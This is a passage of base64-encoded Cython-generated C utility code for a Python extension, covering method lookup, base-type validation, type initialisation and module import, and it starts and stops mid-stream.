jdCh0eXBlLCBweW5hbWUsIGRlc2NyKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihweW5hbWUpOwogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCk7CiAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNldF9pdGVtX3Jlc3VsdCA8IDApKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgKytnZXRzZXQ7CiAgICAgICAgfQogICAgfQogICAgaWYgKGNoYW5nZWQpCiAgICAgICAgUHlUeXBlX01vZGlmaWVkKHR5cGUpOwojZW5kaWYgIC8vIFBZX1ZFUlNJT05fSEVYID4gMHgwMzA5MDBCMQogICAgcmV0dXJuIDA7Cn0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKSB7CiAgICBQeU9iamVjdCAqYXJnWzJdID0ge05VTEwsIE5VTEx9OwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZyArIDEsIDAgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwp9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpIHsKICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge05VTEwsIGFyZ307CiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJncysxLCAxIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTsKfQoKCnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCkgewogICAgUHlPYmplY3QgKmF0dHI7CiNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMgJiYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUAogICAgX19QeXhfVHlwZU5hbWUgdHlwZV9uYW1lOwogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTsKICAgIFB5T2JqZWN0ICpkZXNjcjsKICAgIGRlc2NyZ2V0ZnVuYyBmID0gTlVMTDsKICAgIFB5T2JqZWN0ICoqZGljdHB0ciwgKmRpY3Q7CiAgICBpbnQgbWV0aF9m""b3VuZCA9IDA7CiAgICBhc3NlcnQgKCptZXRob2QgPT0gTlVMTCk7CiAgICBpZiAodW5saWtlbHkodHAtPnRwX2dldGF0dHJvICE9IFB5T2JqZWN0X0dlbmVyaWNHZXRBdHRyKSkgewogICAgICAgIGF0dHIgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG9iaiwgbmFtZSk7CiAgICAgICAgZ290byB0cnlfdW5wYWNrOwogICAgfQogICAgaWYgKHVubGlrZWx5KHRwLT50cF9kaWN0ID09IE5VTEwpICYmIHVubGlrZWx5KFB5VHlwZV9SZWFkeSh0cCkgPCAwKSkgewogICAgICAgIHJldHVybiAwOwogICAgfQogICAgZGVzY3IgPSBfUHlUeXBlX0xvb2t1cCh0cCwgbmFtZSk7CiAgICBpZiAobGlrZWx5KGRlc2NyICE9IE5VTEwpKSB7CiAgICAgICAgUHlfSU5DUkVGKGRlc2NyKTsKI2lmIGRlZmluZWQoUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUikgJiYgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUgogICAgICAgIGlmIChfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKGRlc2NyKSwgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUikpCiNlbHNlCiAgICAgICAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkgfHwgX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhkZXNjcikpKQogICAgICAgICNlbHNlCiAgICAgICAgaWYgKGxpa2VseShQeUZ1bmN0aW9uX0NoZWNrKGRlc2NyKSB8fCBfX1B5eF9JU19UWVBFKGRlc2NyLCAmUHlNZXRob2REZXNjcl9UeXBlKSkpCiAgICAgICAgI2VuZGlmCiNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgbWV0aF9mb3VuZCA9IDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZiA9IFB5X1RZUEUoZGVzY3IpLT50cF9kZXNjcl9nZXQ7CiAgICAgICAgICAgIGlmIChmICE9IE5VTEwgJiYgUHlEZXNjcl9Jc0RhdGEoZGVzY3IpKSB7CiAgICAgICAgICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpOwogICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTsKICAgICAgICAgICAgICAgIGdvdG8gdHJ5X3VucGFjazsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIGRpY3RwdHIgPSBfUHlPYmplY3RfR2V0RGljdFB0cihvYmopOwogICAgaWYgKGRpY3RwdHIgIT0gTlVMTCAmJiAoZGljdCA9ICpkaWN0cHRyKSAhPSBOVUxMKSB7CiAgICAgICAgUHlfSU5DUkVGKGRpY3QpOwogICAgICAgIGF0dHIgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihkaWN0LCBuYW1lKTsKICAgICAgICBpZiAoYXR0ciAhPSBOVUxMKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihhdHRyKTsKICAgICAgICAgICAgUHlfREVDUkVGKGRpY3QpOwogICAgICAgICAgICBQeV9YREVDUkVGKGRlc2NyKTsKICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoZGlj""dCk7CiAgICB9CiAgICBpZiAobWV0aF9mb3VuZCkgewogICAgICAgICptZXRob2QgPSBkZXNjcjsKICAgICAgICByZXR1cm4gMTsKICAgIH0KICAgIGlmIChmICE9IE5VTEwpIHsKICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpOwogICAgICAgIFB5X0RFQ1JFRihkZXNjcik7CiAgICAgICAgZ290byB0cnlfdW5wYWNrOwogICAgfQogICAgaWYgKGxpa2VseShkZXNjciAhPSBOVUxMKSkgewogICAgICAgICptZXRob2QgPSBkZXNjcjsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHR5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUodHApOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX0F0dHJpYnV0ZUVycm9yLAogICAgICAgICAgICAgICAgICInIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgJyVVJyIsCiAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBuYW1lKTsKICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZSh0eXBlX25hbWUpOwogICAgcmV0dXJuIDA7CiNlbHNlCiAgICBhdHRyID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvYmosIG5hbWUpOwogICAgZ290byB0cnlfdW5wYWNrOwojZW5kaWYKdHJ5X3VucGFjazoKI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKGxpa2VseShhdHRyKSAmJiBQeU1ldGhvZF9DaGVjayhhdHRyKSAmJiBsaWtlbHkoUHlNZXRob2RfR0VUX1NFTEYoYXR0cikgPT0gb2JqKSkgewogICAgICAgIFB5T2JqZWN0ICpmdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihhdHRyKTsKICAgICAgICBQeV9JTkNSRUYoZnVuY3Rpb24pOwogICAgICAgIFB5X0RFQ1JFRihhdHRyKTsKICAgICAgICAqbWV0aG9kID0gZnVuY3Rpb247CiAgICAgICAgcmV0dXJuIDE7CiAgICB9CiNlbmRpZgogICAgKm1ldGhvZCA9IGF0dHI7CiAgICByZXR1cm4gMDsKfQoKCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lKSB7CiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICBpbnQgaXNfbWV0aG9kID0gX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKG9iaiwgbWV0aG9kX25hbWUsICZtZXRob2QpOwogICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIG9iaik7CiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgZ290byBiYWQ7CiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcobWV0aG9kKTsKICAgIFB5X0RFQ1JFRihtZXRob2QpOwpiYWQ6CiAgICByZXR1cm4gcmVzdWx0Owp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElM""SU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDUwpzdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBuID0gUHlUdXBsZV9HRVRfU0laRShiYXNlcyk7CiNlbHNlCiAgICBuID0gUHlUdXBsZV9TaXplKGJhc2VzKTsKICAgIGlmICh1bmxpa2VseShuIDwgMCkpIHJldHVybiAtMTsKI2VuZGlmCiAgICBmb3IgKGkgPSAxOyBpIDwgbjsgaSsrKQogICAgewogICAgICAgIFB5VHlwZU9iamVjdCAqYjsKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGJhc2VzLCBpKTsKICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7CiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dFVF9JVEVNKGJhc2VzLCBpKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dldEl0ZW0oYmFzZXMsIGkpOwogICAgICAgIGlmICghYjApIHJldHVybiAtMTsKI2VuZGlmCiAgICAgICAgYiA9IChQeVR5cGVPYmplY3QqKSBiMDsKICAgICAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKGIsIFB5X1RQRkxBR1NfSEVBUFRZUEUpKQogICAgICAgIHsKICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTsKICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICJiYXNlIGNsYXNzICciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJyBpcyBub3QgYSBoZWFwIHR5cGUiLCBiX25hbWUpOwogICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTsKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgIFB5X0RFQ1JFRihiMCk7CiNlbmRpZgogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGlmIChkaWN0b2Zmc2V0ID09IDApCiAgICAgICAgewogICAgICAgICAgICBQeV9zc2l6ZV90IGJfZGljdG9mZnNldCA9IDA7CiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gYi0+dHBfZGljdG9mZnNldDsKI2Vsc2UKICAgICAgICAgICAgUHlPYmplY3QgKnB5X2JfZGljdG9mZnNldCA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KiliLCAiX19kaWN0b2Zmc2V0X18iKTsKICAgICAgICAgICAgaWYgKCFweV9iX2RpY3RvZmZzZXQpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47CiAgICAgICAgICAgIGJfZGljdG9mZnNldCA9IFB5TG9uZ19Bc1NzaXplX3QocHlfYl9kaWN0b2Zmc2V0KTsKICAgICAgICAgICAgUHlfREVDUkVGKHB5X2JfZGlj""dG9mZnNldCk7CiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBkaWN0b2Zmc2V0X3JldHVybjsKI2VuZGlmCiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQpIHsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBfX1B5eF9UeXBlTmFtZSBiX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKGIpOwogICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJleHRlbnNpb24gdHlwZSAnJS4yMDBzJyBoYXMgbm8gX19kaWN0X18gc2xvdCwgIgogICAgICAgICAgICAgICAgICAgICAgICAiYnV0IGJhc2UgdHlwZSAnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIicgaGFzOiAiCiAgICAgICAgICAgICAgICAgICAgICAgICJlaXRoZXIgYWRkICdjZGVmIGRpY3QgX19kaWN0X18nIHRvIHRoZSBleHRlbnNpb24gdHlwZSAiCiAgICAgICAgICAgICAgICAgICAgICAgICJvciBhZGQgJ19fc2xvdHNfXyA9IFsuLi5dJyB0byB0aGUgYmFzZSB0eXBlIiwKICAgICAgICAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBiX25hbWUpOwogICAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShiX25hbWUpOwogICAgICAgICAgICAgICAgfQojaWYgIUNZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgICAgICAgICAgIGRpY3RvZmZzZXRfcmV0dXJuOgojZW5kaWYKI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoYjApOwojZW5kaWYKICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgUHlfREVDUkVGKGIwKTsKI2VuZGlmCiAgICB9CiAgICByZXR1cm4gMDsKfQojZW5kaWYKCgpDWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UoUHlUeXBlT2JqZWN0ICp0KSB7CiAgICB3aGlsZSAodCkgewogICAgICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopOwogICAgICAgIGlmIChiYXNlcykgewogICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgdCA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgfQogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIGludCBfX1B5eF9QeVR5cGVfUmVhZHkoUHlUeXBlT2JqZWN0ICp0KSB7CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKQogICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKICAgICh2b2lkKV9fUHl4X3ZhbGlkYXRl""X2Jhc2VzX3R1cGxlOwojZW5kaWYKICAgIHJldHVybiBQeVR5cGVfUmVhZHkodCk7CiNlbHNlCiAgICBpbnQgcjsKICAgIGlmICghX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UodCkpIHsKICAgICAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpOwogICAgfQogICAgUHlPYmplY3QgKmJhc2VzID0gX19QeXhfUHlUeXBlX0dldFNsb3QodCwgdHBfYmFzZXMsIFB5T2JqZWN0Kik7CiAgICBpZiAoYmFzZXMgJiYgdW5saWtlbHkoX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGUodC0+dHBfbmFtZSwgdC0+dHBfZGljdG9mZnNldCwgYmFzZXMpID09IC0xKSkKICAgICAgICByZXR1cm4gLTE7CiNpZiAhZGVmaW5lZChQWVNUT05fTUFKT1JfVkVSU0lPTikKICAgIHsKICAgICAgICBpbnQgZ2Nfd2FzX2VuYWJsZWQ7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBiMQogICAgICAgIGdjX3dhc19lbmFibGVkID0gUHlHQ19EaXNhYmxlKCk7CiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiAgICAjZWxzZQogICAgICAgIFB5T2JqZWN0ICpyZXQsICpweV9zdGF0dXM7CiAgICAgICAgUHlPYmplY3QgKmdjID0gTlVMTDsKICAgICAgICAjaWYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSswID49IDB4MDcwMzA0MDApICYmXAogICAgICAgICAgICAgICAgIUNZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICBnYyA9IFB5SW1wb3J0X0dldE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2djKTsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgZ2MgPSBQeUltcG9ydF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFnYykpIHJldHVybiAtMTsKICAgICAgICBweV9zdGF0dXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pc2VuYWJsZWQpOwogICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhdHVzKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQogICAgICAgIGdjX3dhc19lbmFibGVkID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3N0YXR1cyk7CiAgICAgICAgUHlfREVDUkVGKHB5X3N0YXR1cyk7CiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkID4gMCkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChnYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9kaXNhYmxlKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFyZXQpKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXQpOwogICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHko""Z2Nfd2FzX2VuYWJsZWQgPT0gLTEpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRihnYyk7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAjZW5kaWYKICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0hFQVBUWVBFOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMAogICAgICAgIHQtPnRwX2ZsYWdzIHw9IFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRTsKI2VuZGlmCiNlbHNlCiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7CiNlbmRpZgogICAgciA9IFB5VHlwZV9SZWFkeSh0KTsKI2lmICFkZWZpbmVkKFBZU1RPTl9NQUpPUl9WRVJTSU9OKQogICAgICAgIHQtPnRwX2ZsYWdzICY9IH5QeV9UUEZMQUdTX0hFQVBUWVBFOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjEKICAgICAgICBpZiAoZ2Nfd2FzX2VuYWJsZWQpCiAgICAgICAgICAgIFB5R0NfRW5hYmxlKCk7CiAgICAjZWxzZQogICAgICAgIGlmIChnY193YXNfZW5hYmxlZCkgewogICAgICAgICAgICBQeU9iamVjdCAqdHAsICp2LCAqdGI7CiAgICAgICAgICAgIFB5RXJyX0ZldGNoKCZ0cCwgJnYsICZ0Yik7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuYWJsZSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkocmV0IHx8IHIgPT0gLTEpKSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHJldCk7CiAgICAgICAgICAgICAgICBQeUVycl9SZXN0b3JlKHRwLCB2LCB0Yik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRwKTsKICAgICAgICAgICAgICAgIFB5X1hERUNSRUYodik7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgICAgIHIgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoZ2MpOwogICAgI2VuZGlmCiAgICB9CiNlbmRpZgogICAgcmV0dXJuIHI7CiNlbmRpZgp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnQoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpmcm9tX2xpc3QsIGludCBsZXZlbCkgewogICAgUHlPYmplY3QgKm1vZHVsZSA9IDA7CiAgICBQeU9iamVjdCAqZW1wdHlfZGljdCA9IDA7CiAgICBQeU9iamVjdCAqZW1wdHlfbGlzdCA9IDA7CiAgICBlbXB0eV9kaWN0ID0gUHlEaWN0X05ldygpOwogICAgaWYgKHVubGlrZWx5KCFlbXB0eV9kaWN0KSkKICAgICAgICBnb3RvIGJhZDsKICAgIGlmIChsZXZlbCA9PSAtMSkgewogICAgICAgIGNvbnN0IGNoYXIqIHBhY2thZ2Vfc2VwID0gc3RyY2hyKF9fUHl4X01PRFVMRV9OQU1FLCAnLicpOwogICAgICAgIGlmIChwYWNrYWdlX3NlcCAhPSAoMCkpIHsKICAgICAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoCiAgICAgICAgICAgICAgICBuYW1lLCBfX3B5eF9tc3RhdGVfZ2xv""YmFsLT5fX3B5eF9kLCBlbXB0eV9kaWN0LCBmcm9tX2xpc3QsIDEpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIHsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhQeUV4Y19JbXBvcnRFcnJvcikpKQogICAgICAgICAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBsZXZlbCA9IDA7CiAgICB9CiAgICBpZiAoIW1vZHVsZSkgewogICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KAogICAgICAgICAgICBuYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBlbXB0eV9kaWN0LCBmcm9tX2xpc3QsIGxldmVsKTsKICAgIH0KYmFkOgogICAgUHlfWERFQ1JFRihlbXB0eV9kaWN0KTsKICAgIFB5X1hERUNSRUYoZW1wdHlfbGlzdCk7CiAgICByZXR1cm4gbW9kdWxlOwp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0Vycm9yKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUsIFB5X3NzaXplX3QgY291bnQpIHsKICAgIFB5T2JqZWN0ICpwYXJ0aWFsX25hbWUgPSBOVUxMLCAqc2xpY2UgPSBOVUxMLCAqc2VwID0gTlVMTDsKICAgIFB5X3NzaXplX3Qgc2l6ZTsKICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICB9CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUocGFydHNfdHVwbGUpOwojZWxzZQogICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShwYXJ0c190dXBsZSk7CiAgICBpZiAoc2l6ZSA8IDApIGdvdG8gYmFkOwojZW5kaWYKICAgIGlmIChsaWtlbHkoc2l6ZSA9PSBjb3VudCkpIHsKICAgICAgICBwYXJ0aWFsX25hbWUgPSBuYW1lOwogICAgfSBlbHNlIHsKICAgICAgICBzbGljZSA9IFB5U2VxdWVuY2VfR2V0U2xpY2UocGFydHNfdHVwbGUsIDAsIGNvdW50KTsKICAgICAgICBpZiAodW5saWtlbHkoIXNsaWNlKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgc2VwID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKCIuIiwgMSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFzZXApKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgICAgICBwYXJ0aWFsX25hbWUgPSBQeVVuaWNvZGVfSm9pbihzZXAsIHNsaWNlKTsKICAgIH0KICAgIFB5RXJyX0Zvcm1hdCgKICAgICAgICBQeUV4Y19Nb2R1bGVOb3RGb3VuZEVycm9yLAogICAgICAgICJObyBtb2R1bGUgbmFtZWQgJyVVJyIsIHBhcnRpYWxfbmFtZSk7CmJhZDoKICAgIFB5X1hERUNSRUYoc2VwKTsKICAgIFB5X1hERUNSRUYoc2xpY2UpOwogICAgUHlfWERFQ1JFRihwYXJ0aWFsX25hbWUpOwogICAgcmV0dXJuIE5VTEw7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9fSW1wb3J0RG90dGVkTW9kdWxlX0xvb2t1""cChQeU9iamVjdCAqbmFtZSkgewogICAgUHlPYmplY3QgKmltcG9ydGVkX21vZHVsZTsKI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlQWV9WRVJTSU9OX05VTSAgPCAweDA3MDMwNDAwKSB8fFwKICAgICAgICBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMCiAgICBQeU9iamVjdCAqbW9kdWxlcyA9IFB5SW1wb3J0X0dldE1vZHVsZURpY3QoKTsKICAgIGlmICh1bmxpa2VseSghbW9kdWxlcykpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBpbXBvcnRlZF9tb2R1bGUgPSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihtb2R1bGVzLCBuYW1lKTsKICAgIFB5X1hJTkNSRUYoaW1wb3J0ZWRfbW9kdWxlKTsKI2Vsc2UKICAgIGltcG9ydGVkX21vZHVsZSA9IFB5S